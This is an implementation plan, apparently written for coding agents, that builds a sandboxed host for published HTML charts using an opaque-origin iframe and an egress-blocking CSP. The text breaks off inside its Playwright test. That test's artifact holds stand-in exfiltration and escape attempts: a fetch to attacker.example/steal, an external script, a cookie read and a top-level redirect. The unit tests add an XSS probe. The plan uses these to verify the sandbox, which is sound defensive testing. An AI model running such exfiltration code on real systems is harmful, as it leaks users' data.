# Visual Host Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Let a Jean agent publish an interactive chart or diagram to
`https://portico.int.okadoc.net/visual/<id>`, where the agent's JavaScript runs but
cannot reach the network, read a session cookie, or escape its frame.

**Architecture:** `/visual/:id` serves a trusted, script-free portico shell that frames
the untrusted artifact at `/visual/:id/raw` with `sandbox="allow-scripts"` and no
`allow-same-origin` — an opaque origin. A CSP on `/raw` permits inline script and
same-origin script (the vendored ECharts/Mermaid bundles under `/vendor/`) while setting
`connect-src 'none'` and permitting no external origin anywhere, so script runs but
nothing leaves.

**Tech Stack:** TypeScript, Express 5, Vitest (in-memory, no DB), Playwright (new),
`@modelcontextprotocol/sdk`, ECharts 5.6.0, Mermaid 11.4.1.

**Spec:** `docs/superpowers/specs/2026-07-14-visual-host-design.md`

## Global Constraints

- Ports & adapters: domain (`application/`, `domain/`, `ports/`) never imports Express.
  Only `interface/http/` touches `Request`/`Response`. `server.ts` is the composition root.
- `type: "module"` — all relative imports carry the `.js` extension, even from `.ts`.
- Node >= 20. TypeScript strict; `exactOptionalPropertyTypes` is on (note the
  `...(x ? { k: x } : {})` spread idiom used throughout the codebase for optional fields).
- `make check` (typecheck + test) must pass before every commit.
- The default test suite stays DB-free and network-free. Playwright is a **separate**
  command (`npm run test:e2e`), never folded into `npm test`.
- **Invariant, never violate:** the artifact iframe gets `sandbox="allow-scripts"` and
  **must never also get `allow-same-origin`** — together they let the framed page delete
  its own sandbox attribute.
- The CSP origin is derived from `settings.baseUrl`. Policies list **both** `'self'` and
  the explicit origin, because `'self'` is unreliable in an opaque-origin sandbox.
- Vendored library paths are version-pinned and immutable. Upgrades add a file; they never
  overwrite or delete one.

---

### Task 1: Publish URLs point at `/visual/:id`, and `/a/:id` redirects

`ArtifactsService.url()` is the only place an artifact URL is built, so this one change
moves every consumer — the `publish_html` tool result, `list_artifacts`, and the portal.
Already-shared `/a/:id` links must keep working.

**Files:**
- Modify: `src/application/artifacts-service.ts` (the `url()` method)
- Modify: `src/interface/http/artifact-routes.ts` (add the `/a/:id` redirect)
- Test: `src/application/artifacts-service.test.ts`, `src/interface/http/artifact-routes.test.ts`

**Interfaces:**
- Consumes: nothing from earlier tasks.
- Produces: `ArtifactsService.url(id: string): string` now returns `${baseUrl}/visual/${id}`.
  Task 2 relies on the `/visual/:id` path shape.

- [ ] **Step 1: Write the failing tests**

In `src/application/artifacts-service.test.ts` there is an **existing** assertion encoding
the old URL — find it in the `"publishes and returns a viewable URL, storing the bytes"`
test and change it:

```ts
    expect(url).toBe(`https://portico.okadoc.com/visual/${id}`);   // was: /a/${id}
```

Then add, using the `svc` built by the file's existing `beforeEach`:

```ts
  it("builds visual URLs under /visual/:id", () => {
    expect(svc.url("abc-123")).toBe("https://portico.okadoc.com/visual/abc-123");
  });
```

In `src/interface/http/artifact-routes.test.ts`, add:

```ts
it("permanently redirects the legacy /a/:id link to /visual/:id", async () => {
  const url = await publishViaMcp("<p>legacy</p>");
  const id = new URL(url).pathname.split("/").pop()!;

  const res = await fetch(`${origin}/a/${id}`, { headers: { cookie }, redirect: "manual" });
  expect(res.status).toBe(301);
  expect(res.headers.get("location")).toBe(`/visual/${id}`);
});
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `npm test -- artifacts-service artifact-routes`
Expected: FAIL — `url()` returns `.../a/abc-123`, and `/a/:id` returns 200, not 301.

- [ ] **Step 3: Change `url()` and add the redirect**

In `src/application/artifacts-service.ts`:

```ts
  url(id: string): string {
    return `${this.deps.baseUrl}/visual/${id}`;
  }
```

In `src/interface/http/artifact-routes.ts`, add this route (keep the existing `/a/:id`
handler for now — Step 3 of Task 2 removes it; here we only need the redirect to exist,
so **replace** the `app.get("/a/:id", …)` body with the redirect):

```ts
  // Legacy artifact links, shared before the visual host existed, keep working.
  app.get("/a/:id", (req: Request, res: Response) => {
    const id = (req.params as Record<string, string>).id ?? "";
    res.redirect(301, `/visual/${encodeURIComponent(id)}`);
  });
```

The existing `/a/:id` viewer logic moves to `/visual/:id/raw` in Task 2. To keep this task
green on its own, temporarily register the old viewer at `/visual/:id` by changing only
its path string:

```ts
  app.get("/visual/:id", async (req: Request, res: Response) => {
    // …existing handler body, unchanged, including the redirect to
    // `/login?next=${encodeURIComponent(`/visual/${id}`)}`
  });
```

- [ ] **Step 4: Run the tests to verify they pass**

Run: `make check`
Expected: PASS. The pre-existing artifact tests still pass because `publishViaMcp` reads
the URL out of the tool result, which now points at `/visual/:id`.

- [ ] **Step 5: Commit**

```bash
git add src/application/artifacts-service.ts src/interface/http/artifact-routes.ts \
        src/application/artifacts-service.test.ts src/interface/http/artifact-routes.test.ts
git commit -m "feat(artifacts): serve artifacts at /visual/:id, 301 the legacy /a/:id"
```

---

### Task 2: Metadata-only lookup, so the shell need not load the blob

The shell renders a title. Fetching the whole artifact body out of blob storage to read one
string is wasteful, so split the visibility check away from the byte fetch. `view()` keeps
its current behaviour by building on the new method — DRY, one copy of the rules.

**Files:**
- Modify: `src/application/artifacts-service.ts`
- Test: `src/application/artifacts-service.test.ts`

**Interfaces:**
- Consumes: `ArtifactsService` from Task 1.
- Produces: `ArtifactsService.viewMeta(viewerUserId: string, id: string): Promise<ArtifactMeta>`
  — throws `ArtifactNotFoundError` (missing / revoked / expired) or `ArtifactForbiddenError`
  (private, not owner). Task 3's shell route calls it.

- [ ] **Step 1: Write the failing test**

Add to the existing describe block. It reuses the `svc`, `owner`, and `other` already
defined at the top of the file (`owner`/`other` are full `User` objects, not `{ id }`):

```ts
  it("viewMeta enforces the same rules as view, without touching blob storage", async () => {
    const { id } = await svc.publish(owner, {
      html: "<p>x</p>",
      title: "Chart",
      visibility: "private",
    });

    const got = await svc.viewMeta(owner.id, id);
    expect(got.title).toBe("Chart");

    await expect(svc.viewMeta(other.id, id)).rejects.toBeInstanceOf(ArtifactForbiddenError);
    await expect(svc.viewMeta(owner.id, "nope")).rejects.toBeInstanceOf(ArtifactNotFoundError);

    await svc.revoke(owner, id);
    await expect(svc.viewMeta(owner.id, id)).rejects.toBeInstanceOf(ArtifactNotFoundError);
  });
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `npm test -- artifacts-service`
Expected: FAIL — `svc.viewMeta is not a function`.

- [ ] **Step 3: Extract `viewMeta`, rebuild `view` on it**

In `src/application/artifacts-service.ts`, replace the existing `view` method with:

```ts
  /** Resolves metadata, enforcing visibility/revocation/expiry. Throws otherwise. */
  async viewMeta(viewerUserId: string, id: string): Promise<ArtifactMeta> {
    const meta = await this.deps.meta.get(id);
    if (!meta || meta.revokedAt) throw new ArtifactNotFoundError();
    if (meta.expiresAt && meta.expiresAt.getTime() <= Date.now()) throw new ArtifactNotFoundError();
    if (meta.visibility === "private" && meta.ownerUserId !== viewerUserId) {
      throw new ArtifactForbiddenError();
    }
    return meta;
  }

  /** Returns the HTML bytes + metadata, enforcing visibility. Throws otherwise. */
  async view(viewerUserId: string, id: string): Promise<{ html: Buffer; meta: ArtifactMeta }> {
    const meta = await this.viewMeta(viewerUserId, id);
    const html = await this.deps.store.get(meta.storageRef);
    if (!html) throw new ArtifactNotFoundError();
    return { html, meta };
  }
```

- [ ] **Step 4: Run the tests to verify they pass**

Run: `make check`
Expected: PASS — including the pre-existing `view()` tests, which are unchanged in behaviour.

- [ ] **Step 5: Commit**

```bash
git add src/application/artifacts-service.ts src/application/artifacts-service.test.ts
git commit -m "refactor(artifacts): extract viewMeta so a viewer can check access without fetching bytes"
```

---

### Task 3: Vendored ECharts + Mermaid at immutable `/vendor/` paths

Charts need a library, and no external origin may ever be allowed (an external
`<script src="//host/?d=SECRET">` is itself an exfiltration channel). So the bundles are
served from portico's own origin.

The bytes are **committed to the repo**, not copied out of `node_modules` at build time.
A published artifact hard-codes the path it was written against; committing the exact
bytes is what guarantees a visual published today still renders in a year, and makes
"upgrades add a file, never replace one" a property of the repo rather than a rule someone
has to remember.

**Files:**
- Create: `vendor/echarts-5.6.0.min.js` (downloaded)
- Create: `vendor/mermaid-11.4.1.min.js` (downloaded)
- Create: `vendor/README.md` (provenance: source URL + sha256 + bundle format)
- Modify: `src/interface/http/server.ts` (mount `/vendor`)
- Test: `src/interface/http/artifact-routes.test.ts`

**Interfaces:**
- Consumes: nothing.
- Produces: `GET /vendor/echarts-5.6.0.min.js` and `GET /vendor/mermaid-11.4.1.min.js`,
  both public (no session), both `Cache-Control: public, max-age=31536000, immutable`.
  Task 5's tool description and the Task 6 skill reference these exact paths.

- [ ] **Step 1: Download the bundles and record provenance**

```bash
mkdir -p vendor
curl -fsSL https://unpkg.com/echarts@5.6.0/dist/echarts.min.js -o vendor/echarts-5.6.0.min.js
curl -fsSL https://unpkg.com/mermaid@11.4.1/dist/mermaid.min.js -o vendor/mermaid-11.4.1.min.js
shasum -a 256 vendor/*.js
```

Then check what Mermaid actually shipped:

```bash
head -c 300 vendor/mermaid-11.4.1.min.js
```

**Verify before continuing:** ECharts 5.x ships a UMD bundle, so `<script src>` defines a
global `echarts`. Mermaid 11 is expected to ship a UMD `mermaid.min.js` defining a global
`mermaid`, but if that URL 404s or the file turns out to be an ES module (look for
`export{` / `import{` at the top), fetch `dist/mermaid.esm.min.mjs` instead, save it as
`vendor/mermaid-11.4.1.esm.min.mjs`, and use `<script type="module">` in every template
and test below. **Record which form you got in `vendor/README.md`** — the tool description
(Task 5) and the skill (Task 6) must match reality, or agents will write pages that load
nothing.

Write `vendor/README.md`:

```markdown
# Vendored browser libraries

Served at `/vendor/<file>`, unauthenticated, `immutable` cached, and referenced by
published visuals. **Never modify or delete a file here** — a visual published against
`echarts-5.6.0.min.js` will load that exact path forever. To upgrade, add a new
version-pinned file alongside the old one.

Not fetched from a CDN and not integrity-checked with SRI, because the artifact CSP
permits no external origin at all — these bytes are same-origin and deployed with the app.

| File | Source | sha256 | Global |
|---|---|---|---|
| `echarts-5.6.0.min.js` | https://unpkg.com/echarts@5.6.0/dist/echarts.min.js | `<paste>` | UMD → `echarts` |
| `mermaid-11.4.1.min.js` | https://unpkg.com/mermaid@11.4.1/dist/mermaid.min.js | `<paste>` | UMD → `mermaid` |
```

- [ ] **Step 2: Write the failing test**

In `src/interface/http/artifact-routes.test.ts`:

```ts
it("serves vendored chart libraries publicly and immutably", async () => {
  const res = await fetch(`${origin}/vendor/echarts-5.6.0.min.js`); // no cookie on purpose
  expect(res.status).toBe(200);
  expect(res.headers.get("content-type")).toContain("javascript");
  expect(res.headers.get("cache-control")).toContain("immutable");

  const mermaid = await fetch(`${origin}/vendor/mermaid-11.4.1.min.js`);
  expect(mermaid.status).toBe(200);
});
```

- [ ] **Step 3: Run the test to verify it fails**

Run: `npm test -- artifact-routes`
Expected: FAIL — 404, no `/vendor` route is mounted.

- [ ] **Step 4: Mount `/vendor` in the composition root**

In `src/interface/http/server.ts`, next to the existing `WEB_DIST` constant:

```ts
/** Vendored browser libs for published visuals. Resolved the same way from `src/` and `dist/`. */
const VENDOR_DIR = resolve(dirname(fileURLToPath(import.meta.url)), "../../../vendor");
```

and inside `buildApp`, in the `// --- interface ---` block **before** `registerPortal(app)`:

```ts
  // Vendored chart libraries for published visuals. Public on purpose: these are
  // open-source bundles holding nothing secret, and gating them would couple asset
  // loading to a session cookie reaching an opaque-origin iframe. Served from their own
  // directory rather than `web/dist` so `make dev` — which never builds the portal —
  // can still render a chart.
  app.use(
    "/vendor",
    express.static(VENDOR_DIR, {
      immutable: true,
      maxAge: "1y",
      index: false,
      fallthrough: false,
    }),
  );
```

- [ ] **Step 5: Run the tests to verify they pass**

Run: `make check`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add vendor src/interface/http/server.ts src/interface/http/artifact-routes.test.ts
git commit -m "feat(vendor): serve pinned ECharts + Mermaid bundles at immutable /vendor paths"
```

---

### Task 4: The shell, the sandbox, and the script-capable CSP

The load-bearing task. `/visual/:id` becomes a trusted, script-free shell that frames the
untrusted artifact at `/visual/:id/raw`. Both routes are session-gated and both enforce
visibility — `/raw` is a directly reachable URL, not an internal detail.

**Files:**
- Create: `src/interface/http/visual-shell.ts` (shell HTML + both CSP builders)
- Create: `src/interface/http/visual-shell.test.ts`
- Modify: `src/interface/http/artifact-routes.ts` (split into shell + raw; the file keeps
  its name because the domain object is still an *artifact* — only the public URL is
  "visual")
- Modify: `src/interface/http/server.ts` (pass `baseUrl` into the route deps)
- Test: `src/interface/http/artifact-routes.test.ts`

**Interfaces:**
- Consumes: `ArtifactsService.viewMeta` (Task 2); `/vendor/*` (Task 3).
- Produces: `shellHtml(title: string, rawPath: string): string`,
  `artifactCsp(origin: string): string`, `shellCsp(origin: string): string`.
  `ArtifactRouteDeps` gains `baseUrl: string`.

- [ ] **Step 1: Write the failing unit tests for the shell module**

Create `src/interface/http/visual-shell.test.ts`:

```ts
import { describe, it, expect } from "vitest";
import { shellHtml, artifactCsp, shellCsp } from "./visual-shell.js";

const ORIGIN = "https://portico.example";

describe("visual shell", () => {
  it("frames the artifact with allow-scripts and never allow-same-origin", () => {
    const html = shellHtml("Pod restarts", "/visual/abc/raw");
    expect(html).toContain('sandbox="allow-scripts"');
    // The one invariant that matters: together, these two let the framed page
    // remove its own sandbox attribute.
    expect(html).not.toContain("allow-same-origin");
    expect(html).toContain('src="/visual/abc/raw"');
  });

  it("escapes the title so an artifact title cannot inject markup into the shell", () => {
    const html = shellHtml('</title><script>alert(1)</script>', "/visual/abc/raw");
    expect(html).not.toContain("<script>alert(1)</script>");
    expect(html).toContain("&lt;script&gt;");
  });

  it("carries no script of its own", () => {
    expect(shellCsp(ORIGIN)).toContain("script-src 'none'");
  });

  it("lets the artifact run script from inline and our own origin, and reach nothing", () => {
    const csp = artifactCsp(ORIGIN);
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain(`script-src 'unsafe-inline' 'self' ${ORIGIN}`);
    expect(csp).toContain("connect-src 'none'");
    expect(csp).not.toContain("http://");           // no external origin, ever
    // frame-ancestors 'none' would block our OWN shell from framing it.
    expect(csp).toContain(`frame-ancestors 'self' ${ORIGIN}`);
    expect(csp).not.toContain("frame-ancestors 'none'");
  });
});
```

- [ ] **Step 2: Run to verify it fails**

Run: `npm test -- visual-shell`
Expected: FAIL — cannot resolve `./visual-shell.js`.

- [ ] **Step 3: Write the shell module**

Create `src/interface/http/visual-shell.ts`:

```ts
import { escapeHtml } from "./html.js";

/**
 * The trusted chrome around an untrusted artifact.
 *
 * `sandbox="allow-scripts"` WITHOUT `allow-same-origin` gives the framed document an
 * opaque origin: its script cannot read portico's session cookie or localStorage, cannot
 * see this document, and — with no `allow-top-navigation` — cannot redirect the tab to
 * an attacker's URL. Granting both `allow-scripts` and `allow-same-origin` would let the
 * page reach into its own DOM and delete this very attribute. Never add it.
 *
 * The shell itself contains no script, which is why its CSP can say `script-src 'none'`.
 */
export function shellHtml(title: string, rawPath: string): string {
  const t = escapeHtml(title);
  return `<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>${t}</title>
<style>
  html, body { margin: 0; height: 100%; }
  body { display: flex; flex-direction: column;
         font: 14px/1.5 -apple-system, system-ui, sans-serif; color: #1c2530; }
  header { flex: 0 0 auto; display: flex; align-items: baseline; gap: .6rem;
           padding: .7rem 1rem; border-bottom: 1px solid #e4e7ec; }
  header b { font-weight: 600; }
  header span { color: #667085; font-size: 12px; }
  iframe { flex: 1 1 auto; width: 100%; border: 0; }
</style></head>
<body>
  <header><b>${t}</b><span>portico</span></header>
  <iframe src="${escapeHtml(rawPath)}" sandbox="allow-scripts" title="${t}"></iframe>
</body></html>`;
}

/**
 * CSP for the untrusted artifact document.
 *
 * Script is allowed — inline (so an agent can configure a chart with real data) and from
 * our own origin (the vendored bundles). Egress is not: `connect-src 'none'` kills
 * fetch/XHR/WebSocket/sendBeacon, and because no external origin appears anywhere, there
 * is no `<script src="//attacker/?d=…">` channel either. Script runs; nothing leaves.
 *
 * Both `'self'` and the explicit origin are listed: `'self'` is unreliable in an
 * opaque-origin sandbox, and the explicit origin can miss when a deployment's baseUrl and
 * its actual served origin differ (dev ports). Listing both is belt and braces.
 */
export function artifactCsp(origin: string): string {
  return [
    "default-src 'none'",
    `script-src 'unsafe-inline' 'self' ${origin}`,
    `style-src 'unsafe-inline' 'self' ${origin}`,
    "img-src data: blob:",
    "font-src data:",
    "connect-src 'none'",
    "base-uri 'none'",
    "form-action 'none'",
    // NOT 'none' — that would block our own shell from framing this document.
    `frame-ancestors 'self' ${origin}`,
  ].join("; ");
}

/** CSP for the trusted shell, which has no script and loads nothing but its own frame. */
export function shellCsp(origin: string): string {
  return [
    "default-src 'none'",
    "script-src 'none'",
    "style-src 'unsafe-inline'",
    "img-src data:",
    `frame-src 'self' ${origin}`,
    "base-uri 'none'",
    "form-action 'none'",
    "frame-ancestors 'none'",
  ].join("; ");
}
```

- [ ] **Step 4: Run to verify the unit tests pass**

Run: `npm test -- visual-shell`
Expected: PASS (4 tests).

- [ ] **Step 5: Write the failing route tests**

In `src/interface/http/artifact-routes.test.ts`, **replace** the existing
`"publishes via the Portico tool and serves it to a logged-in browser with a strict CSP"`
test — its `expect(csp).not.toContain("script-src")` assertion encodes exactly the
behaviour we are removing — with:

```ts
it("serves the shell at /visual/:id, framing the artifact in a script-only sandbox", async () => {
  const url = await publishViaMcp("<h1>Quarterly report</h1>");
  const path = new URL(url).pathname;

  const res = await fetch(`${origin}${path}`, { headers: { cookie }, redirect: "manual" });
  expect(res.status).toBe(200);
  const body = await res.text();
  expect(body).toContain('sandbox="allow-scripts"');
  expect(body).not.toContain("allow-same-origin");
  expect(body).toContain(`src="${path}/raw"`);
  // The shell is chrome, not content: the artifact body is not inlined into it.
  expect(body).not.toContain("Quarterly report</h1>");
  expect(res.headers.get("content-security-policy")).toContain("script-src 'none'");
});

it("serves the artifact bytes at /raw, with script allowed but no way to phone home", async () => {
  const url = await publishViaMcp("<h1>Quarterly report</h1>");
  const path = new URL(url).pathname;

  const res = await fetch(`${origin}${path}/raw`, { headers: { cookie }, redirect: "manual" });
  expect(res.status).toBe(200);
  expect(await res.text()).toContain("Quarterly report");

  const csp = res.headers.get("content-security-policy")!;
  expect(csp).toContain("script-src 'unsafe-inline' 'self'");
  expect(csp).toContain("connect-src 'none'");
  expect(csp).not.toContain("frame-ancestors 'none'");
});

it("gates /raw on its own — it is a real URL, not an internal detail", async () => {
  const url = await publishViaMcp("<p>secret</p>");
  const path = new URL(url).pathname;

  const res = await fetch(`${origin}${path}/raw`, { redirect: "manual" }); // no cookie
  expect(res.status).toBe(302);
  expect(res.headers.get("location")).toContain("/login");
});

it("returns 404 for /raw once the artifact is revoked", async () => {
  const url = await publishViaMcp("<p>temp</p>");
  const id = new URL(url).pathname.split("/").pop()!;

  const client = new Client({ name: "t", version: "0" });
  const transport = new StreamableHTTPClientTransport(new URL(`${origin}/mcp`), {
    requestInit: { headers: { Authorization: `Bearer ${token}` } },
  });
  await client.connect(transport);
  await client.callTool({ name: "portico__revoke_artifact", arguments: { id } });
  await client.close();

  const res = await fetch(`${origin}/visual/${id}/raw`, { headers: { cookie }, redirect: "manual" });
  expect(res.status).toBe(404);
});
```

Also update the pre-existing revoke test's final fetch from `${origin}/a/${id}` to expect a
`301` (it now redirects) — or simply delete it, since the new `/raw` revoke test above
covers the behaviour and Task 1's redirect test covers `/a/:id`.

- [ ] **Step 6: Run to verify they fail**

Run: `npm test -- artifact-routes`
Expected: FAIL — `/visual/:id` currently returns the raw artifact body, and `/visual/:id/raw` 404s.

- [ ] **Step 7: Rewrite the routes**

Replace the whole body of `src/interface/http/artifact-routes.ts`:

```ts
import type { Express, Request, Response } from "express";
import type { UserStore } from "../../ports/identity.js";
import type { SessionCodec } from "../../adapters/session/cookie.js";
import type { ArtifactsService } from "../../application/artifacts-service.js";
import { ArtifactForbiddenError, ArtifactNotFoundError } from "../../domain/errors.js";
import { currentUser } from "./session.js";
import { page } from "./html.js";
import { shellHtml, artifactCsp, shellCsp } from "./visual-shell.js";

export interface ArtifactRouteDeps {
  artifacts: ArtifactsService;
  sessions: SessionCodec;
  users: UserStore;
  /** Origin named explicitly in both CSPs; `'self'` is unreliable in a sandboxed frame. */
  baseUrl: string;
}

function sendError(res: Response, err: unknown): void {
  if (err instanceof ArtifactForbiddenError) {
    res.status(403).send(page("Not permitted", "<h1>Not permitted</h1><p>You don't have access to this visual.</p>"));
  } else if (err instanceof ArtifactNotFoundError) {
    res.status(404).send(page("Not found", "<h1>Not found</h1><p>This visual does not exist, was revoked, or has expired.</p>"));
  } else {
    console.error("visual view error", err);
    res.status(500).send(page("Error", "<h1>Error</h1><p>Could not load this visual.</p>"));
  }
}

/**
 * The visual host.
 *
 * `/visual/:id`     — trusted, script-free shell; frames the artifact.
 * `/visual/:id/raw` — the untrusted artifact itself, opaque-origin sandboxed by the shell.
 * `/a/:id`          — legacy links, redirected.
 *
 * Both visual routes are session-gated and both run the full visibility check: `/raw` is a
 * URL a person can paste into a browser, so it defends itself rather than trusting the shell.
 */
export function registerArtifactRoutes(app: Express, deps: ArtifactRouteDeps): void {
  const { artifacts, sessions, users, baseUrl } = deps;

  app.get("/a/:id", (req: Request, res: Response) => {
    const id = (req.params as Record<string, string>).id ?? "";
    res.redirect(301, `/visual/${encodeURIComponent(id)}`);
  });

  app.get("/visual/:id", async (req: Request, res: Response) => {
    const id = (req.params as Record<string, string>).id ?? "";
    const user = await currentUser(req, sessions, users);
    if (!user) {
      res.redirect(`/login?next=${encodeURIComponent(`/visual/${id}`)}`);
      return;
    }
    try {
      const meta = await artifacts.viewMeta(user.id, id);
      res
        .status(200)
        .set("Content-Type", "text/html; charset=utf-8")
        .set("Content-Security-Policy", shellCsp(baseUrl))
        .set("X-Content-Type-Options", "nosniff")
        .set("Referrer-Policy", "no-referrer")
        .set("Cache-Control", "private, no-store")
        .send(shellHtml(meta.title ?? "Visual", `/visual/${encodeURIComponent(id)}/raw`));
    } catch (err) {
      sendError(res, err);
    }
  });

  app.get("/visual/:id/raw", async (req: Request, res: Response) => {
    const id = (req.params as Record<string, string>).id ?? "";
    const user = await currentUser(req, sessions, users);
    if (!user) {
      res.redirect(`/login?next=${encodeURIComponent(`/visual/${id}`)}`);
      return;
    }
    try {
      const { html } = await artifacts.view(user.id, id);
      res
        .status(200)
        .set("Content-Type", "text/html; charset=utf-8")
        .set("Content-Security-Policy", artifactCsp(baseUrl))
        .set("X-Content-Type-Options", "nosniff")
        .set("Referrer-Policy", "no-referrer")
        .set("Cache-Control", "private, no-store")
        .send(html);
    } catch (err) {
      sendError(res, err);
    }
  });
}
```

Note the unauthenticated `/raw` redirect sends the browser to the **shell**, not back to
`/raw` — landing a person on a bare artifact document is not a page we want to serve as a
destination.

In `src/interface/http/server.ts`, pass the origin through:

```ts
  registerArtifactRoutes(app, {
    artifacts,
    sessions,
    users: stores.users,
    baseUrl: settings.baseUrl,
  });
```

- [ ] **Step 8: Run the full gate**

Run: `make check`
Expected: PASS.

- [ ] **Step 9: Commit**

```bash
git add src/interface/http/visual-shell.ts src/interface/http/visual-shell.test.ts \
        src/interface/http/artifact-routes.ts src/interface/http/artifact-routes.test.ts \
        src/interface/http/server.ts
git commit -m "feat(visual): sandbox artifacts in an opaque-origin iframe behind a script-free shell"
```

---

### Task 5: Teach the tool that visuals are now possible

The MCP tool description is the only thing an agent reads before calling it. It must name
the exact vendored paths and the rules that fail *silently* if broken.

**Files:**
- Modify: `src/interface/mcp/portico-server.ts` (the `portico__publish_html` tool def)
- Test: `src/interface/http/mcp-routes.test.ts`

**Interfaces:**
- Consumes: the `/vendor/*` paths from Task 3.
- Produces: no code interface; the description text is contract for the Task 6 skill.

- [ ] **Step 1: Write the failing test**

In `src/interface/http/mcp-routes.test.ts`, inside the existing describe block, using the
file's existing `connect(bearer)` helper and `token`:

```ts
  it("tells the agent how to write a visual that will actually render", async () => {
    const client = await connect(token);
    try {
      const { tools } = await client.listTools();
      const publish = tools.find((t) => t.name === "portico__publish_html")!;
      const d = publish.description!;

      // The exact vendored paths — an agent cannot guess these.
      expect(d).toContain("/vendor/echarts-5.6.0.min.js");
      expect(d).toContain("/vendor/mermaid-11.4.1.min.js");
      // The failure mode that is silent, and therefore the one worth spelling out.
      expect(d).toMatch(/CDN|external/i);
    } finally {
      await client.close();
    }
  });
```

- [ ] **Step 2: Run to verify it fails**

Run: `npm test -- mcp-routes`
Expected: FAIL — the description mentions no vendor paths.

- [ ] **Step 3: Rewrite the tool description**

In `src/interface/mcp/portico-server.ts`, in the `portico__publish_html` tool def:

```ts
        description:
          "Publish an HTML document (report, dashboard, chart, diagram) and get back a " +
          "login-gated URL to share — e.g. post it into a Slack thread. Only authenticated " +
          "Portico users can open it.\n" +
          "JavaScript RUNS, inside a sandboxed frame. Charting libraries are vendored and " +
          "MUST be loaded from these exact same-origin paths:\n" +
          "  <script src=\"/vendor/echarts-5.6.0.min.js\"></script>   (global: echarts)\n" +
          "  <script src=\"/vendor/mermaid-11.4.1.min.js\"></script>  (global: mermaid)\n" +
          "The page cannot reach the network at all. These FAIL SILENTLY — a blank page, no " +
          "error: any CDN or external <script src>, any fetch/XHR/WebSocket, any remote image " +
          "or font. Inline <script> and inline <style> are fine; embed data as a literal in the " +
          "page, and inline images as data: URIs.",
```

- [ ] **Step 4: Run to verify it passes**

Run: `make check`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/interface/mcp/portico-server.ts src/interface/http/mcp-routes.test.ts
git commit -m "feat(mcp): tell publish_html about the vendored libs and the CSP's silent failures"
```

---

### Task 6: Playwright — observe the boundary actually holding

Every security claim in this plan is a claim about **browser behaviour**. Vitest can only
assert that we sent the header we meant to send; it cannot tell us the sandbox holds. A
typo'd sandbox attribute or a wrong CSP directive passes every test written so far.

The suite drives a real Chromium: it publishes one artifact that renders a chart *and*
attempts every escape, then checks what the browser permitted.

**Files:**
- Create: `playwright.config.ts`
- Create: `e2e/visual.spec.ts`
- Modify: `package.json` (devDep + `test:e2e` script)
- Modify: `Makefile` (a `test-e2e` target, matching the existing target style)
- Modify: `.github/workflows/ci.yml` (install browsers, run e2e)

**Interfaces:**
- Consumes: everything above.
- Produces: `npm run test:e2e`.

- [ ] **Step 1: Add Playwright**

```bash
npm i -D @playwright/test@^1.49.0
npx playwright install --with-deps chromium
```

In `package.json` scripts, add — note it is deliberately **not** part of `npm test`, which
stays browser-free:

```json
    "test:e2e": "playwright test",
```

- [ ] **Step 2: Configure Playwright**

Create `playwright.config.ts`. No `webServer`: the spec boots the app in-process, which
lets it mint a session cookie directly and skip Google OIDC entirely.

```ts
import { defineConfig } from "@playwright/test";

export default defineConfig({
  testDir: "./e2e",
  fullyParallel: false,
  reporter: process.env.CI ? "list" : "line",
  use: { headless: true },
});
```

- [ ] **Step 3: Write the failing e2e spec**

Create `e2e/visual.spec.ts`:

```ts
import { test, expect } from "@playwright/test";
import type { AddressInfo } from "node:net";
import type { Server } from "node:http";
import { loadConfig } from "../src/config.js";
import { buildApp, type BuiltApp } from "../src/interface/http/server.js";
import { SESSION_COOKIE } from "../src/interface/http/identity-routes.js";

const PORT = 8099;

// baseUrl MUST equal the origin the browser actually talks to: the artifact CSP names
// this origin explicitly, and a mismatch would block the vendored <script src> and make
// the whole suite fail for a reason unrelated to what it is testing.
const env: Record<string, string> = {
  PORTICO_BASE_URL: `http://localhost:${PORT}`,
  PORTICO_PORT: String(PORT),
  PORTICO_ENCRYPTION_KEY: Buffer.alloc(32, 5).toString("base64"),
  PORTICO_SESSION_SECRET: "test-session-secret-value",
  PORTICO_GOOGLE_CLIENT_ID: "cid",
  PORTICO_GOOGLE_CLIENT_SECRET: "sec",
  PORTICO_ALLOWED_DOMAINS: "okadoc.com",
  PORTICO_ARTIFACT_BLOB_ACCOUNT: "acct",
};

/** Renders a chart, and tries every escape we claim to block. Records what the browser allowed. */
const ARTIFACT = `<!doctype html><html><body>
<div id="chart" style="width:600px;height:400px"></div>
<script src="/vendor/echarts-5.6.0.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/left-pad/index.js"
        onerror="document.body.dataset.extscript='blocked'"></script>
<script>
  echarts.init(document.getElementById('chart')).setOption({
    xAxis: { data: ['a','b','c'] }, yAxis: {},
    series: [{ type: 'bar', data: [3, 7, 2] }],
  });
  fetch('https://attacker.example/steal?d=1')
    .then(() => { document.body.dataset.fetch = 'ALLOWED'; })
    .catch(() => { document.body.dataset.fetch = 'blocked'; });
  try { document.body.dataset.cookie = document.cookie ? 'READABLE' : 'empty'; }
  catch { document.body.dataset.cookie = 'blocked'; }
  try { top.location = 'https://attacker.example/'; } catch { /* expected */ }
</script>
</body></html>`;

let built: BuiltApp;
let server: Server;
let origin: string;
let visualUrl: string;
let cookieValue: string;

test.beforeAll(async () => {
  built = buildApp({ settings: loadConfig(env), pool: null });
  server = await new Promise<Server>((r) => {
    const s = built.app.listen(PORT, () => r(s));
  });
  origin = `http://localhost:${(server.address() as AddressInfo).port}`;

  const user = await built.stores.users.upsertByIdentity({
    issuer: "iss", subject: "sub", email: "u@okadoc.com",
  });
  cookieValue = await built.sessions.sign(user.id);
  const { id } = await built.artifacts.publish(user, { html: ARTIFACT, title: "Boundary" });
  visualUrl = `${origin}/visual/${id}`;
});

test.afterAll(async () => {
  await new Promise<void>((r) => server.close(() => r()));
});

test("the chart renders, and nothing escapes the sandbox", async ({ page, context }) => {
  await context.addCookies([
    { name: SESSION_COOKIE, value: cookieValue, domain: "localhost", path: "/" },
  ]);

  // Every request the page makes, so an exfil attempt cannot hide behind a passing assertion.
